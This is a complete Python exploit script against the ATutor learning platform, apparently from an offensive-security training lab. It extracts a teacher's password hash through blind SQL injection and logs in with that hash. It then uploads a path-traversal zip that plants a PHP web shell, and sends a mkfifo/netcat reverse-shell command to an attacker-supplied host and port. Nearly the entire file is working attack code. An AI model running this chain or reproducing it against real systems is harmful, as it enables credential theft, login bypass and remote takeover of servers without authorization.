#!/usr/bin/python3

import requests
import hashlib
import zipfile
import argparse
from io import BytesIO
import os
import time
from requests_toolbelt.multipart.encoder import MultipartEncoder
import string

session_token = ""
# teacher_hash = "8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e"
# admin_hash = "f865b53623b121fd34ee5426c792e5c33af8c227"

proxies = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080"
}


def process_sql_exploit(host):   
    # here we should do more sqli to get the database name, table name, and user so we know what to attack, same exploit different tables selected
    allchars = string.printable
    # get the length of the value we want to extract
    vlength = 0
    ticks = 0
    while vlength == 0 and ticks < 1000:
        ticks+=1
        payload = f"(SELECT LENGTH(password) from AT_members where member_id=1)={ticks}"
        if process_request(host, payload):
            vlength = ticks
    print(f"[+] Found length of password: {vlength}")

    # #now we iterate from 0 to vlength and extract one char at a time
    vvalue = ""
    for x in range(0, vlength):
        for t in allchars:
            y=x+1
            payload = f"(SELECT ASCII(SUBSTR(password,{y},1)) from AT_members where member_id=1)={ord(t)}"
            if process_request(host, payload):
                vvalue+=t
    print(f"[+] Found password hash: {vvalue}")
    return vvalue

    
def process_request(host, bit):
    payload = f"syk0') or {bit}#"
    payload = payload.replace(" ","/**/").replace("#","%23")
    url = f"{host}/ATutor/mods/_standard/social/index_public.php?q={payload}"
    cookie = {"ATutorID": "gjbr1tp7ma8ulff9bu8d479650"}
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                      "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Cache-Control": "max-age=0"}
    prequest = requests.get(url, headers=headers, cookies=cookie, proxies={"http": "http://127.0.0.1:8080", "https":"http://127.0.0.1:8080"})
    if prequest.ok:
        if "Offensive - Security" in prequest.text:
            return True
    return False


def _build_zip():
    if os.path.exists("poc.zip"):
        os.remove("poc.zip")

    archive = BytesIO()

    with zipfile.ZipFile(archive, 'w') as zip_archive:
        with zip_archive.open('imsmanifest.xml', 'w') as file1:
            file1.write(b'<tag>x</tag>a')

        with zip_archive.open('../../../../../../../../var/www/html/ATutor/mods/syk0/poc.phtml', 'w') as file2:
            file2.write(
                b'<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; print_r(system($_REQUEST["cmd"])); echo "</pre>"; }')

    zip = open('poc.zip', 'wb')
    zip.write(archive.getbuffer())
    zip.close()


def exploit():
    parser = argparse.ArgumentParser(add_help=True)
    parser.add_argument(
        '-host', help="The host you mean to attack", required=True)
    parser.add_argument(
        '-srv_host', help="The attacker machine IP", required=True)
    parser.add_argument(
        '-srv_port', help="The port you are listening on for the reverse shell", required=True)
    args = parser.parse_args()

    burp0_headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Origin": f"{args.host}",
        "Connection": "close",
        "Referer": f"{args.host}/ATutor/mods/_standard/tests/index.php",
        "Upgrade-Insecure-Requests": "1"
    }
    # get the password hash using sqli
    print("[+] Use SQL injection to get the password hash first")
    teacher_hash = process_sql_exploit(args.host)
    if teacher_hash != "":
        # get the session token
        burp0_url = f"{args.host}/ATutor/login.php"
        session = requests.session()
        re = session.get(burp0_url, headers=burp0_headers, proxies=proxies)
        if re.ok:
            t = re.text.split('document.form.form_password.value) + "')
            session_token = t[1].split('"')[0]
        print(f"[+] found session token for password hashing {session_token}")

        login_data = {
            "form_login_action": "true",
            "form_course_id": "",
            "form_password_hidden": hashlib.sha1((teacher_hash + session_token).encode()).hexdigest(),
            "p": '',
            "form_login": "teacher",
            "token": session_token,
            "submit": "Login"
        }

        login_request = session.post(
            burp0_url, headers=burp0_headers, data=login_data, proxies=proxies)
        if login_request.ok:
            if "You have logged in successfully." in login_request.text:
                print("[+] Login bypassed ")
                print("[+] building zip file")
                upload_url = f"{args.host}/ATutor/mods/_standard/tests/import_test.php"
                # we need to access the course so that the session on the server is set correctly
                bits = login_request.text.split("my_courses_container")
                bits2 = bits[1].split('<a href="')[1].split('">')[0]
                if "bounce.php" in bits2:
                    url = f"{args.host}/ATutor/{bits2}"
                    course_set_request = session.get(url, headers=burp0_headers, proxies=proxies)
                    if course_set_request.ok:
                        print("[+] course session should be set proceed with upload")
                        _build_zip()

                        data = {
                            "submit_import": "Import"
                        }
                        files = {
                            "file": open("poc.zip", "rb")
                        }
                        mp_encoder = MultipartEncoder(
                            fields={
                                'file': ('poc.zip', open("poc.zip", "rb"), 'application/zip'),
                                'submit_import': 'Import'
                            }
                        )
                        burp0_headers["Content-Type"] = mp_encoder.content_type
                        upload_request = session.post(upload_url, headers=burp0_headers, data=mp_encoder, proxies=proxies)
                        if "XML error: Invalid document " in upload_request.text:
                            print("[+] upload successful")
                            burp0_headers["Content-Type"] = "application/x-www-form-urlencoded"
                            payload_url = f"{args.host}/ATutor/mods/syk0/poc.phtml"
                            shell_payload = {"cmd" : f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {args.srv_host} {args.srv_port} >/tmp/f"}                        
                            payload_request = session.post(payload_url, headers=burp0_headers, data=shell_payload, proxies=proxies)
                    


if __name__ == "__main__":
    exploit()
